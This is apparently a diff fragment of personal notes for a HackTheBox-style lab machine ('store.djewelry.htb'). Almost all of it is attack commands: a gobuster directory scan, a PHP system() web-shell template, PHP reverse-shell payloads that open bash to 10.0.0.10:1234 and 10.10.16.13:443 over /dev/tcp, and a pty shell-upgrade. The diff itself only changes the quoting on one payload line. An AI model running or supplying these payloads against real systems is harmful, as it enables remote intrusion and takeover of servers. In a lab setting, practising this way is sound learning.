@@ -11,7 +11,7 @@ gobuster dir  -u http://store.djewelry.htb/ -w /Users/timmy/github/SecLists/Disc
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
 
 data=f'<?php system(\'{cmd}\') ?>')
-data=f'<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.13/443 0>&1'") ?>')
+data=f'<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.13/443 0>&1'") ?>')'
 
 python3 -c "import pty;pty.spawn('/bin/bash')"
 export TERM=xterm
